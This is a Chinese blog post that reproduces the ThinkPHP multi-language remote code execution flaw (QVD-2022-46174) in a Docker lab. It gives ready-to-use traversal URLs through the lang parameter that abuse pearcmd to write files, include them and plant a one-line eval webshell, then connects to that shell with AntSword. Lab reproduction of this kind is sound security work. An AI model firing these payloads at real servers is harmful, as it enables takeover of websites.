> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/zeyMQg-tbpQET6n07KjJeQ)

一、漏洞描述
------

ThinkPHP 是一个开源免费的，快速、简单的面向对象的轻量级 PHP 开发框架，是为了敏捷 WEB 应用开发和简化企业应用开发而诞生的。

近日，被爆出存在 **ThinkPHP 远程代码执行漏洞 (QVD-2022-46174)**，即当 ThinkPHP 开启了多语言功能时，攻击者可以通过 lang 参数和目录穿越实现文件包含，当存在其他扩展模块如 pear 扩展时，攻击者可进一步利用文件包含实现远程代码执行 (getshell)。

如果 Thinkphp 程序一旦开启了多语言功能，攻击者可以通过 get、header、cookie 等位置传入参数，实现目录穿越 + 文件包含，通过 pearcmd 文件包含的方法即可实现 RCE。

二、影响范围
------

```
v6.0.1 < Thinkphp < v6.0.13
Thinkphp v5.0.x
Thinkphp v5.1.x
```

三、漏洞复现
------

基础环境：

1、centos 系统

2、thinkphp 6.0.12

使用 docker 搭建环境

```
docker pull vulfocus/thinkphp:6.0.12
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nN21VibypEpR9v4gJHQnrcictdI7ic70Ln8uPsclKwicdEtvd6icia7RlkLQd1qUHuajt08yIrILeDXrlWw/640?wx_fmt=jpeg)

拉取成功之后运行镜像

```
docker run -d -p 8081:80 IMAGE ID
```

然后访问如下地址，可以看到 thinkphp 成功部署了

```
http://xx.xx.xx.xx:8081/public/index.php
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nN21VibypEpR9v4gJHQnrcict8diawibbkZ3Jow2f5YI5SWa3O8PdqASbxIlSBnyibBXhW0oTM02BhUm3g/640?wx_fmt=jpeg)

如上图所示可以看到 thinkphp 已经安装部署完成了。

通过漏洞通报可以知道，此次漏洞的前置条件是需要开启多语言功能

```
ThinkPHP 6
打开app/middleware.php
如果 \think\middleware\LoadLangPack::class 没有注释，代表着受此漏洞影响。

ThinkPHP 5
打开config/app.php，如果 'lang_switch_on' 为 true，代表着受此漏洞影响。
```

因此先进入容器进行查看是否满足前置条件

```
docker ps -a
docker exec -it CONTAINER ID  bash
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nN21VibypEpR9v4gJHQnrcicticxnqxLBo8Dp7Srh84fruv9fKLaSVtTibiaV7N1fJC1M4P6oAjibia6FkJQ/640?wx_fmt=jpeg)

进入到 app 目录查看 middleware.php 文件的内容，如下

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nN21VibypEpR9v4gJHQnrcictWemQYIwHfPuRdq1NztTBANXDe2uBC49km2OOgOuILM8ibDiaIibiaog4GQ/640?wx_fmt=jpeg)

可以看到这里确实没有注释，也就是说是满足漏洞存在条件的

其次，因为这个漏洞的深入利用要借助到 pearcmd 的文件写入技巧，所以还需要查看 pearcmd 所在的路径

查看漏洞环境中 pearcmd 的路径是在

```
/usr/local/lib/php/
```

如下图所示

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nN21VibypEpR9v4gJHQnrcictHiaRB6WfguHSRqeSWxzflalSziaic2vtVLhNCUyPzNR4djicoMiaKslhELw/640?wx_fmt=jpeg)

到这里漏洞复现所需要的前置条件都已经满足了，那么测试下列 poc

```
# 写文件
http://xx.xx.xx.xx:8081/public/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&<?=phpinfo()?>+/tmp/hello.php

# 包含文件
http://xx.xx.xx.xx:8081/public/index.php?lang=../../../../../../../../tmp/hello

# 直接写一句话木马
http://xx.xx.xx.xx:8081/public/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_REQUEST['ant']);?>+/var/www/html/ant.php
```

首先进行写入文件测试

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nN21VibypEpR9v4gJHQnrcictKjokVSMjNqXboicKDI3JF1pB8vwEPT0J2xiameZH7Wana9wFaQfGsUsg/640?wx_fmt=jpeg)

得到响应之后查看 tmp 目录下是否成功写入

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nN21VibypEpR9v4gJHQnrcictnJpmydUG5CEV611ehfZvpBgIbiaqhlv9FzF3RURibnGBbX4gs1bOMK2A/640?wx_fmt=jpeg)

经过前后对比可以发现确实将`<?=phpinfo()?>`成功写入到了 tmp 目录下的 hello.php 文件中了。

接下来测试文件包含的 poc

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nN21VibypEpR9v4gJHQnrcictTonf1pngaA7icibzgibf9uqcNqhIrluYECVCMcSDjj2Hic3YZQruhib21SA/640?wx_fmt=jpeg)

可以看到 hello.php 文件的代码确实被包含执行了。

最后就是直接写入一句话木马进行 getshell 了。

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nN21VibypEpR9v4gJHQnrcictVDDpgiaYSzsVcYzXMAt62nKPeCpgLyFb1ILE0x2GRa6mG3JlH2iboTaw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nN21VibypEpR9v4gJHQnrcictWRbUzts03UhkCT9DGl6LnVbUjqSsicHcVqcd0e99kWaRkg8Jj6AWyNQ/640?wx_fmt=jpeg)

直接用蚁剑连接测试

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nN21VibypEpR9v4gJHQnrcictDbdvFed7exB10Zur7aYpNNGmugARcO0q6ibUD6MJqqDibvJmlnpK61Ow/640?wx_fmt=jpeg)

根据这个漏洞的通报可以知道，攻击者可以通过 get、header、cookie 等位置传入参数，实现目录穿越 + 文件包含，通过 pearcmd 文件包含的方法即可实现 RCE。那么接下来对几个位置传入参数进行测试

1、利用 Header 写入文件，如下图：

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nN21VibypEpR9v4gJHQnrcictm8kn2f12MnVTvEVf5VhyUDweZVlKCZ3mslCRIhOwaTZe23AKhmWobg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nN21VibypEpR9v4gJHQnrcict5pVeOTZSjbYCqFYpzNqxeGn78Yq0B5Na4ngy6iauTMfGNkndzC6qHgw/640?wx_fmt=jpeg)

2、利用 Cookie 写入文件，如下图：

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nN21VibypEpR9v4gJHQnrcict2xFNZgr3ic1H05Npiap2xoqLHRwE3xhjBEZdL8Tkabmz6OTCc7P80gpw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nN21VibypEpR9v4gJHQnrcictqxRIOZFDFgVxafUHichRkWd6OIsFFaia7PcbRwlcYpb45UtOicOribHiadA/640?wx_fmt=jpeg)

        这里主要是利用 pearcmd.php 这个 pecl/pear 中的文件。pecl 是 PHP 中用于管理扩展而使用的命令行工具，而 pear 是 pecl 依赖的类库。在 7.3 及以前，pecl/pear 是默认安装的；在 7.4 及以后，需要我们在编译 PHP 的时候指定 --with-pear 才会安装。

不过，在 Docker 任意版本镜像中，pcel/pear 都会被默认安装，安装的路径在 / usr/local/lib/php。由此看来该漏洞对 Docker 中运行的启用了多语言模块的 ThinkPHP 影响较大。

四、pearcmd 文件包含注意事项
------------------

使用 pearcmd 进行文件包含的前提是开启了`register_argc_argv`

如果存在 php.ini 的话，默认是 Off。如果没有 php.ini 则默认是 On。

开启之后，`$_SERVER['argv']`就会生效。

1、cli 模式下，不论是否开启`register_argc_argv`，都可以获取命令行或者说外部参数

如果开启了，第一个参数`$_SERVER['argv'][0]`是脚本名，其余的是传递给脚本的参数

2、web 模式下，只有开启了 register_argc_argv，才可以获取外部参数

`$_SERVER['argv'][0] = $_SERVER['QUERY_STRING']`

argv,argc 在 web 模式下不适用

PHP 官方提供的镜像里面也是默认没有 php.ini，所以也是默认开启了这个`register_argc_argv`：

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nN21VibypEpR9v4gJHQnrcictXVsLxlgf0aLdgd4a40oP9xB0KD8WBWyQSYxH03Nyv8WibbYyyrRM3RA/640?wx_fmt=jpeg)

这里因为是用的 thinkphp 框架，所以浏览器访问属于是 web 模式，而复现的环境中用的是 php 的镜像，所以也是默认开启了`register_argc_argv`。

值得注意的是刚才上面的 poc 中参数值之间用的是 + 而不是以前的 &，这是因为在 web 模式中 argv 是通过 + 作为分隔符来获取不同参数值的。

```
http://xx.xx.xx.xx:8081/public/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=phpinfo()?>+/tmp/hello.php

这个poc的意思是lang参数的值是调用了pearcmd.php文件，接着又使用了其中的config-create命令。
该命令需要传入两个参数。
其中第二个参数，比如/tmp/hello.php是写入的文件路径，第一个参数则是写入到这个文件中的具体内容。
```

### config-create

通过查看源码，再对比 poc 的构造，理解了为什么需要在 config-create 后面添加一个`/`。

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nN21VibypEpR9v4gJHQnrcictg0icM2oFSO9lfOChcDUMX7ys3AnMWxGaiagtkQM4rePBt11SVqvyF03A/640?wx_fmt=jpeg)

大致就是变量设置为`<root path>`的子目录并保存在`<filename>`中

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nN21VibypEpR9v4gJHQnrcict7sQx9SkRmib17EGrdM7FeB05FXknwiagaKJUqRRbAibIn54ib3njGdXA1A/640?wx_fmt=jpeg)

由此处还可以看出`<root path>`还需要以 `/` 开头，作为父级目录  

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nN21VibypEpR9v4gJHQnrcictPYlHY3kbTcAp6A9PYOhRA3JuWNWU6hlDGpswzFiaQ5WDZQX448jo5og/640?wx_fmt=jpeg)

加上`/`之后即可成功写入

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nN21VibypEpR9v4gJHQnrcictf0O0cwnqIGAabENhSbcjw6evjViaxB5kuBYcEmSLD3fvzBDf8OlIosA/640?wx_fmt=jpeg)

如果少了两个必要参数值会显示如下错误

![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nN21VibypEpR9v4gJHQnrcictztfLYOeqiaDvXuDCjicvibJxZ0q7Q1wczAwjp8MPAZhmShvum9LQtQDAQ/640?wx_fmt=jpeg)

因此，使用 config-create 命令时，除了两个必要的参数值之外，还需要加入`/`作为父级目录，这里可以理解为三个参数的形式，也可以理解为第一个参数的值最开始必须以`/`作为开头。

参考链接
----

```
https://blog.csdn.net/weixin_45751765/article/details/121628030
https://blog.csdn.net/RABCDXB/article/details/122050370
https://blog.csdn.net/JCPS_Y/article/details/127541665
```